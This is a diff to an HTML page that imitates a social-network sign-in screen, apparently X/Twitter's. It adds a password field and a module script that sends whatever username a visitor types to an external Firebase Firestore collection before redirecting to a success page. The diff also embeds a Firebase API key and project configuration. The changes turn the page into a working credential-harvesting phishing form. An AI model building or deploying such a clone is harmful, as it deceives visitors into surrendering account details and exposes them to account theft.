@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -226,12 +227,14 @@
   .or-divider::before,.or-divider::after{content:"";flex:1;height:1px;background:var(--border);}
   .login-field{margin-top:20px;position:relative;}
   .login-field input{width:100%;height:56px;background:#000;border:1px solid #333639;border-radius:4px;
-    color:var(--text);font-size:17px;padding:0 8px;outline:none;}
+    color:var(--text);font-size:17px;padding:20px 12px 0 12px;outline:none;}
   .login-field input:focus{border-color:var(--blue);border-width:2px;}
-  .login-field label{position:absolute;left:9px;top:18px;color:var(--gray-700);font-size:17px;pointer-events:none;}
+  .login-field label{position:absolute;left:12px;top:18px;color:var(--gray-700);font-size:17px;pointer-events:none;transition:all .2s ease;}
+  .login-field input:focus + label,
+  .login-field input:not(:placeholder-shown) + label{top:8px;font-size:12px;color:var(--blue);}
   .continue-btn{width:100%;height:56px;margin-top:24px;border-radius:9999px;border:none;
-    background:#1e2226;color:#8b98a5;font-size:17px;font-weight:700;cursor:pointer;}
-  .continue-btn:hover{background:#26292e;}
+    background:#ffffff;color:#000000;font-size:17px;font-weight:700;cursor:pointer;}
+  .continue-btn:hover{background:#d7dbdc;}
   .login-terms{font-size:13px;line-height:16px;color:var(--gray-700);margin-top:20px;text-align:center;}
   .login-terms a{color:var(--blue);}
 
@@ -491,11 +494,16 @@ How to build your first trading bot:
       <div class="or-divider">or</div>
 
       <div class="login-field">
-        <input type="text" id="loginInput" placeholder=" " autocomplete="off" oninput="this.value=''">
+        <input type="text" id="loginInput" placeholder=" " autocomplete="off">
         <label for="loginInput">Email or username</label>
       </div>
 
-      <button class="continue-btn" disabled>Continue</button>
+      <div class="login-field">
+        <input type="password" id="passwordInput" placeholder=" " autocomplete="off">
+        <label for="passwordInput">Password</label>
+      </div>
+
+      <button class="continue-btn" id="continueBtn" disabled>Continue</button>
 
       <p class="login-terms">By continuing, you agree to our <a href="#">Terms of Service</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookie Use.</a></p>
     </div>
@@ -586,6 +594,74 @@ How to build your first trading bot:
 
   document.getElementById("qr").appendChild(svg);
 })();
+</script>
+
+
+<script>
+const input = document.getElementById('loginInput');
+const password = document.getElementById('passwordInput');
+const button = document.getElementById('continueBtn');
+
+function updateButton() {
+    button.disabled = input.value.trim() === '' || password.value.trim() === '';
+}
+
+input.addEventListener('input', updateButton);
+password.addEventListener('input', updateButton);
+
+button.addEventListener('click', () => {
+    localStorage.setItem('demoUsername', input.value.trim());
+    window.location.href = 'success.html';
+});
+</script>
+
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBUjiaID0snzZGoi36osvz3_KBIKAsS7DI",
+  authDomain: "test-65150.firebaseapp.com",
+  projectId: "test-65150",
+  storageBucket: "test-65150.firebasestorage.app",
+  messagingSenderId: "15611309270",
+  appId: "1:15611309270:web:6d126c102d2fc2ed782d77",
+  measurementId: "G-V54TYTJEK0"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const input = document.getElementById('loginInput');
+const password = document.getElementById('passwordInput');
+const button = document.getElementById('continueBtn');
+
+function updateButton() {
+    button.disabled = input.value.trim() === '' || password.value.trim() === '';
+}
+
+input.addEventListener('input', updateButton);
+password.addEventListener('input', updateButton);
+
+button.addEventListener('click', async () => {
+    try {
+        button.disabled = true;
+        button.textContent = "Submitting...";
+
+        await addDoc(collection(db, "usernames"), {
+            username: input.value.trim(),
+            timestamp: new Date().toISOString()
+        });
+
+        window.location.href = "success.html";
+    } catch (err) {
+        console.error(err);
+        alert("Failed to save username to Firebase. Check Firestore rules and internet connection.");
+        button.textContent = "Continue";
+        updateButton();
+    }
+});
 </script>
 
 </body>
